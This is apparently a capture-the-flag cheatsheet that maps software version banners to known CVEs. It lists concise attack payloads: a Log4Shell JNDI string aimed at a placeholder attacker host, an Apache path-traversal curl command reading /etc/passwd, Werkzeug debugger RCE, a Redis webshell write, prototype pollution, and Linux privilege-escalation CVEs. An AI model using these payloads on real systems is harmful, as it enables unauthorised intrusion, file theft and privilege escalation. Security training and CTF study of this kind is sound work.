# CVE / Version Triage Cheatsheet

## Rule
A version banner without a corresponding exploit attempt is wasted recon. Banner →
search pattern → adapted exploit within the same session.

## Recurring families (CTF favorites)
- Flask/Werkzeug < 0.15 debugger PIN → `/console` RCE with predictable PIN
  (inputs: username, modname=flask.app, appname=flask, /etc/machine-id, MAC of eth0).
- Log4Shell: `${jndi:ldap://ATTACKER/a}` in ANY header; CTF often just needs
  `${jndi:ldap://127.0.0.1:1389/a}` ping observed in logs.
- Spring4Shell / SpEL injection: `class.module.classLoader` param tampering.
- Apache path confusion (CVE-2021-41773): `curl --path-as-is /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`.
- Sudo < 1.9.5p2 (Baron Samedit), CVE-2021-4034 (pwnkit), CVE-2022-0847 (dirty pipe)
  — check `sudo --version`, kernel `uname -r` on privesc.
- Rsync/Redis/Memcached unauth → RCE chains: redis `SLAVEOF` module load or
  `CONFIG SET dir` webshell write.
- Node: prototype pollution in query merges → `?__proto__[admin]=1` / gadget RCE
  (ejs, handlebars compile).

## Exploit adaptation discipline
1. Public PoC runs against a slightly different version → read the diff of the
   vulnerable function, adjust offsets/paths yourself; do not paste-and-pray.
2. No public PoC → the advisory patch diff IS the exploit hint: patch = the bug.
